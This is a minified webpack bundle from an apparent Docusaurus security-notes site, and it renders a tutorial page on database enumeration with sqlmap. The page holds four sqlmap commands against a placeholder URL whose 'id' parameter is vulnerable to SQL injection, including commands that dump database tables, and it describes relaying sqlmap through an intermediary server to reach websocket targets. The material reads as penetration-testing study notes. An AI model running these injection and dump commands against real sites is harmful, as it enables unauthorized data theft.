"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[5364],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>b});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var c=a.createContext({}),u=function(e){var t=a.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=u(e.components);return a.createElement(c.Provider,{value:t},e.children)},l="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,c=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),l=u(n),d=r,b=l["".concat(c,".").concat(d)]||l[d]||m[d]||o;return n?a.createElement(b,i(i({ref:t},p),{},{components:n})):a.createElement(b,i({ref:t},p))}));function b(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=d;var s={};for(var c in t)hasOwnProperty.call(t,c)&&(s[c]=t[c]);s.originalType=e,s[l]="string"==typeof e?e:r,i[1]=s;for(var u=2;u<o;u++)i[u]=n[u];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},9738:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>u,default:()=>f,frontMatter:()=>c,metadata:()=>p,toc:()=>m});var a=n(7462),r=n(7294),o=n(3905);function i(e,t){return i=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e},i(e,t)}const s=function(e){var t,n;function a(){return e.apply(this,arguments)||this}n=e,(t=a).prototype=Object.create(n.prototype),t.prototype.constructor=t,i(t,n);var o=a.prototype;return o.componentDidMount=function(){this._updateIframeContent()},o.componentDidUpdate=function(e,t){this._updateIframeContent()},o._defineUrl=function(){var e=this.props,t=e.id,n=e.file;return"https://gist.github.com/"+t+".js"+(n?"?file="+n:"")},o._updateIframeContent=function(){var e=this.props,t=e.id,n=e.file,a=this.iframeNode,r=a.document;a.contentDocument?r=a.contentDocument:a.contentWindow&&(r=a.contentWindow.document);var o='<html><head><base target="_parent"><style>*{font-size:12px;}</style></head><body '+("onload=\"parent.document.getElementById('"+(n?"gist-"+t+"-"+n:"gist-"+t)+"').style.height=document.body.scrollHeight + 'px'\"")+">"+('<script type="text/javascript" src="'+this._defineUrl()+'"><\/script>')+"</body></html>";r.open(),r.writeln(o),r.close()},o.render=function(){var e=this,t=this.props,n=t.id,a=t.file;return r.createElement("iframe",{ref:function(t){e.iframeNode=t},width:"100%",frameBorder:0,id:a?"gist-"+n+"-"+a:"gist-"+n})},a}(r.PureComponent),c={id:"database-enumeration",title:"Databases"},u="Database enumeration",p={unversionedId:"security/enumeration/database-enumeration",id:"security/enumeration/database-enumeration",title:"Databases",description:"sqlmap",source:"@site/docs/security/02-enumeration/02-database-enumeration.md",sourceDirName:"security/02-enumeration",slug:"/security/enumeration/database-enumeration",permalink:"/docs/security/enumeration/database-enumeration",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/02-enumeration/02-database-enumeration.md",tags:[],version:"current",sidebarPosition:2,frontMatter:{id:"database-enumeration",title:"Databases"},sidebar:"securitySidebar",previous:{title:"Domains",permalink:"/docs/security/enumeration/domain-enumeration"},next:{title:"\ud83d\udd12 Privilege escalation",permalink:"/docs/security/privilege-escalation/"}},l={},m=[{value:"sqlmap",id:"sqlmap",level:2},{value:"Using sqlmap with websockets",id:"using-sqlmap-with-websockets",level:3}],d={toc:m},b="wrapper";function f(e){let{components:t,...r}=e;return(0,o.kt)(b,(0,a.Z)({},d,r,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"database-enumeration"},"Database enumeration"),(0,o.kt)("h2",{id:"sqlmap"},"sqlmap"),(0,o.kt)("p",{align:"center"},(0,o.kt)("img",{src:n(3894).Z})),(0,o.kt)("p",null,"Use ",(0,o.kt)("inlineCode",{parentName:"p"},"-u")," to define the target url and ",(0,o.kt)("inlineCode",{parentName:"p"},"--batch")," to use the default behavior without asking for input."),(0,o.kt)("p",null,"In the next commands, ",(0,o.kt)("inlineCode",{parentName:"p"},"id")," is a query parameter that is vulnerable to SQL injection."),(0,o.kt)("p",null,"Enumerate databases."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-sh"},'sqlmap -u "http://website.com/?id=1" --batch --dbs\n')),(0,o.kt)("p",null,"Enumerate tables of a specific database."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-sh"},'sqlmap -u "http://website.com/?id=1" --batch --tables -D db_name\n')),(0,o.kt)("p",null,"Enumerate tables content of a specific database."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-sh"},'sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name\n')),(0,o.kt)("p",null,"Enumerate content by specifing table, column, and database."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-sh"},'sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name -T table_name -C col_name\n')),(0,o.kt)("h3",{id:"using-sqlmap-with-websockets"},"Using sqlmap with websockets"),(0,o.kt)("p",null,"sqlmap may not support all types of requests, including those made over websockets. Also, working with complex targets can sometimes be cumbersome using sqlmap alone."),(0,o.kt)("p",null,"To simplify the process, it is possible to set up a fake server as an intermediary. In this way, sqlmap would make a request to the fake server using a common format, and the fake server would then make the more complex request to the actual target."),(0,o.kt)("p",{align:"center"},(0,o.kt)("img",{src:n(7794).Z})),(0,o.kt)(s,{id:"4adec402e51df2bf3e35066172abaebf",mdxType:"Gist"}))}f.isMDXComponent=!0},3894:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/sqlmap-19ab36f4fcb837c1a823a44ad989cd4f.png"},7794:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/sqlmap_over_websockets-001b1de5593b04c3c09f79857073d13a.png"}}]);